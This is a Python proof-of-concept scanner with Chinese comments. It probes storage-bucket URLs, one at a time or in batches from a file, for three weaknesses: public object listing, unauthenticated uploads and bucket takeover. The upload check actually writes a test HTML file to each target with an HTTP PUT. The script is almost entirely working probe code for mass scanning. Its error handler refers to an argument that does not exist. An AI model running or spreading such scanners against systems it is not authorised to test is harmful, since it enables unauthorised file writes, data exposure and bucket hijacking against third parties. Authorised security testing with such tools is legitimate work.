import requests
import argparse
import urllib3
urllib3.disable_warnings()
def POC_ListObject(url):
    response = requests.get(url,verify=False)  # 发送GET请求
    if "<Key>" in response.text and "<ID>" in response.text:
     print(url+"存在bucket配置错误漏洞")
def POC_PutObject(url):
    test_url = url + "/tEst123.html"
    data = "<h1>\ntesttest\n</h1>"
    response = requests.put(test_url, data=data,verify=False)
    if response.status_code == 200 :
        print(url+"存在任意文件上传漏洞")
def POC_Hijack(url):
    response = requests.get(url,verify=False)  # 发送GET请求
    if "NoSuchBucket" in response.text :
     print(url+"存在存储桶劫持漏洞")

def clean_urls(urls):
    cleaned_urls = []  # 创建一个新列表用于存放处理后的URL
    for url in urls:
        if url is not None and url.endswith('/'):
            url = url[:-1]  # 删除末尾的斜杠
        cleaned_urls.append(url)  # 将处理后的URL添加到新列表中
    return cleaned_urls


def main(url):

    # 在这里执行你的操作，使用传入的url参数
    POC_ListObject(url)
    POC_PutObject(url)
    POC_Hijack(url)

if __name__ == "__main__":
    # 创建一个ArgumentParser对象
    parser = argparse.ArgumentParser()
    # 添加-u参数
    parser.add_argument("-u", "--url", help="输入URL参数")
    parser.add_argument('-r', '--recursive', nargs='?', const='', metavar='FILE', help='TXT文件路径以此批量读取url')
    # 解析命令行参数
    args = parser.parse_args()

    # 获取url参数的值
    url = args.url
    urls = [url]
    urls = clean_urls(urls)
    if args.recursive:
        try:
            with open(args.recursive, 'r') as file:
                lines = file.readlines()
                urls = [line.rstrip('\n') for line in lines]
        except FileNotFoundError:
            print(f"文件 '{args.read_file}' 不存在")
    # 调用主函数
    for url in urls:
        main(url)
